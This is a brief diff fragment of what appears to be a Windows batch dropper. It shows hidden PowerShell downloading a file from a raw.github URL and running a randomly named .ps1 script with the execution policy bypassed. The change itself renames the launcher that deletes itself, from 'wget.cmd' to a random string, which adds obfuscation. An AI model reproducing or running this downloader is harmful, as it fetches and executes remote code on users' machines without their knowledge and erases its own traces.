@@ -30,4 +30,4 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 
 powershell powershell.exe -windowstyle hidden -ep bypass "./BVrAihDwJNvc.ps1"
 
-del wget.cmd
+del IVbaANzwiphH.cmd
